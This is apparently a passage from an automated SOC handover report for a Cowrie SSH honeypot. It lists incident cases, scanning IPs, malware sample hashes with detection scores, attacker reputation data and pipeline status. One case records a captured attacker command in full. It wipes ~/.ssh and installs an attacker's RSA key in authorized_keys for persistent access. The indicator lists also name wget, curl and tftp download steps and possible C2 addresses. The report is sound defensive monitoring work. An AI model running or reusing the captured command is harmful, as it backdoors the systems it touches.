| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:46:03` | `cowrie.session.connect` |
| `2026-07-11 14:46:03` | `cowrie.client.version` |
| `2026-07-11 14:46:03` | `cowrie.client.kex` |
| `2026-07-11 14:46:04` | `cowrie.login.success` |
| `2026-07-11 14:46:05` | `cowrie.session.params` |
| `2026-07-11 14:46:05` | `cowrie.command.input` |
| `2026-07-11 14:46:05` | `cowrie.command.failed` |
| `2026-07-11 14:46:05` | `cowrie.log.closed` |
| `2026-07-11 14:46:06` | `cowrie.session.params` |
| `2026-07-11 14:46:06` | `cowrie.command.input` |
| `2026-07-11 14:46:06` | `cowrie.session.file_download` |
| `2026-07-11 14:46:06` | `cowrie.log.closed` |
| `2026-07-11 14:46:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.68.98[.]152` to AbuseIPDB if not already reported
- [ ] Block `111.68.98[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74a79fb28beb

| Field | Detail |
|---|---|
| **Source IP** | `111.68.98[.]152` |
| **First Seen** | 2026-07-11 14:46 |
| **Last Seen** | 2026-07-11 14:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:46:07` | `cowrie.session.connect` |
| `2026-07-11 14:46:07` | `cowrie.client.version` |
| `2026-07-11 14:46:07` | `cowrie.client.kex` |
| `2026-07-11 14:46:08` | `cowrie.login.success` |
| `2026-07-11 14:46:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.68.98[.]152` to AbuseIPDB if not already reported
- [ ] Block `111.68.98[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be267e96674d

| Field | Detail |
|---|---|
| **Source IP** | `111.68.98[.]152` |
| **First Seen** | 2026-07-11 14:46 |
| **Last Seen** | 2026-07-11 14:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:46:08` | `cowrie.session.connect` |
| `2026-07-11 14:46:08` | `cowrie.client.version` |
| `2026-07-11 14:46:08` | `cowrie.client.kex` |
| `2026-07-11 14:46:09` | `cowrie.login.success` |
| `2026-07-11 14:46:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.68.98[.]152` to AbuseIPDB if not already reported
- [ ] Block `111.68.98[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08ec7fda6f88

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 14:50 |
| **Last Seen** | 2026-07-11 14:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:50:38` | `cowrie.session.connect` |
| `2026-07-11 14:50:39` | `cowrie.client.version` |
| `2026-07-11 14:50:39` | `cowrie.client.kex` |
| `2026-07-11 14:50:42` | `cowrie.login.success` |
| `2026-07-11 14:50:44` | `cowrie.session.params` |
| `2026-07-11 14:50:44` | `cowrie.command.input` |
| `2026-07-11 14:50:44` | `cowrie.log.closed` |
| `2026-07-11 14:50:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-632fa644e262

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-11 14:51 |
| **Last Seen** | 2026-07-11 14:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:51:07` | `cowrie.session.connect` |
| `2026-07-11 14:51:07` | `cowrie.client.version` |
| `2026-07-11 14:51:07` | `cowrie.client.kex` |
| `2026-07-11 14:51:07` | `cowrie.login.success` |
| `2026-07-11 14:51:07` | `cowrie.direct-tcpip.request` |
| `2026-07-11 14:51:08` | `cowrie.direct-tcpip.data` |
| `2026-07-11 14:51:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `179.61.192[.]156` | **24** | 2026-07-11 13:01 | 2026-07-11 14:53 | 21m | 0 | `T1592` | 🟠 MEDIUM |
| `104.143.10[.]174` | **16** | 2026-07-11 12:57 | 2026-07-11 14:51 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `107.150.146[.]69` | **16** | 2026-07-11 13:18 | 2026-07-11 14:48 | 9m | 0 | `T1592` | 🟠 MEDIUM |
| `160.119.71[.]92` | **7** | 2026-07-11 14:23 | 2026-07-11 14:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]115` | **6** | 2026-07-11 13:37 | 2026-07-11 14:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-07-11 12:57 | 2026-07-11 14:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | **2** | 2026-07-11 14:03 | 2026-07-11 14:40 | 2m | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]39` | **2** | 2026-07-11 14:25 | 2026-07-11 14:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `23.239.11[.]64` | **2** | 2026-07-11 14:24 | 2026-07-11 14:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | **2** | 2026-07-11 13:15 | 2026-07-11 13:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]50` | **2** | 2026-07-11 14:44 | 2026-07-11 14:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `111.21.105[.]250` | 1 | 2026-07-11 14:42 | 2026-07-11 14:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.62.56[.]228` | 1 | 2026-07-11 13:47 | 2026-07-11 13:47 | 8s | 0 | `T1592` | 🟢 LOW |
| `147.45.60[.]18` | 1 | 2026-07-11 14:05 | 2026-07-11 14:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `173.255.221[.]189` | 1 | 2026-07-11 14:33 | 2026-07-11 14:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.253.248[.]180` | 1 | 2026-07-11 14:36 | 2026-07-11 14:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]209` | 1 | 2026-07-11 14:17 | 2026-07-11 14:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `212.8.242[.]38` | 1 | 2026-07-11 13:35 | 2026-07-11 13:36 | 35s | 0 | `T1592` | 🟢 LOW |
| `36.137.38[.]119` | 1 | 2026-07-11 14:10 | 2026-07-11 14:10 | 6s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-07-11 13:02 | 2026-07-11 13:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-07-11 13:36 | 2026-07-11 13:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-07-11 13:36 | 2026-07-11 13:36 | 5s | 0 | `T1592` | 🟢 LOW |
| `72.14.178[.]148` | 1 | 2026-07-11 14:33 | 2026-07-11 14:33 | 2s | 0 | `T1592` | 🟢 LOW |
| `83.191.176[.]93` | 1 | 2026-07-11 13:55 | 2026-07-11 13:57 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 57/100 | 🟡 MEDIUM | **18/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/73** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 39/100 | 🟢 LOW | **23/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/73** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc` | ELF Binary (Linux executable) (x86 32-bit) | `77ed8c7518a32663...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `7a4a3a129b726b53...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `85338e737e8b8c9ff9742ebc5bb0b73d91d441774161ad936f14910259d985ba` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `85338e737e8b8c9f...` | 60/100 | 🟡 MEDIUM | **26/73** 🔴 |
| `85a17fe8e290a224a717445d0f5e819283567101a92945ea10069946dc7e19d8` | Shell Script | `85a17fe8e290a224...` | 56/100 | 🟡 MEDIUM | **16/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **44/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` (7a4a3a129b726b531941b41d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `147.45.60[.]18` | US | GLOBAL CONNECTIVITY SOLUTIONS LLP | **100** ⚠️ | 3 |
| `23.239.11[.]64` | US | Linode | **100** ⚠️ | 22 |
| `178.178.222[.]59` | RU | PJSC MegaFon | **100** ⚠️ | 50 |
| `47.89.228[.]114` | US | Alibaba Cloud - US | **100** ⚠️ | 11 |
| `69.6.222[.]101` | BR | Newfold Digital, Inc. | **100** ⚠️ | 3 |
| `200.115.234[.]24` | AR | Telecentro S.A. - Clientes Residenciales | **100** ⚠️ | 11 |
| `83.191.176[.]93` | SE | SE TELE2 BROADBAND | **100** ⚠️ | 44 |
| `45.79.207[.]181` | US | Linode | **100** ⚠️ | 50 |
| `107.150.146[.]69` | US | Internap Network Services Corporation | **100** ⚠️ | 41 |
| `36.137.38[.]119` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 111 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 85 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 31 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 31 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 31 |

---

## 🔕 False Positive Summary (20 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 16 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 202 cases |
| Tool 34  | Credential Extractor        | ✅ 124 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 73 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 20 filtered (9.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 48 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 85 priority case(s) shown individually · 24 recon entry/entries in table (11 group(s) consolidating 84 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-11T14:58:51Z_
